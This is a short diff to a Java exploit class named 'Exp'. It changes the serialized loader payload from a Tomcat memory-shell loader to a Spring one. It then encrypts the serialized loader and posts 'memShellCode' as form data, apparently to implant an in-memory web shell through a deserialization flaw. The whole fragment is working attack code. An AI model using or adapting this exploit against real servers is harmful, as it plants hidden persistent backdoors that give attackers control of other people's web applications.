@@ -65,7 +65,7 @@ public class Exp {
             RequestBody body = new FormBody.Builder()
                     .add("classData", memShellCode).build();
 
-            Object loaderObj = Payload.getPayload("TomcatMemLoader");
+            Object loaderObj = Payload.getPayload("SpringMemLoader");
             byte[] loaderBytes = Payload.serialize(loaderObj);
             ByteSource loaderSource = cipherService.encrypt(loaderBytes, keyBytes);
             byte[] loaderValue = loaderSource.getBytes();
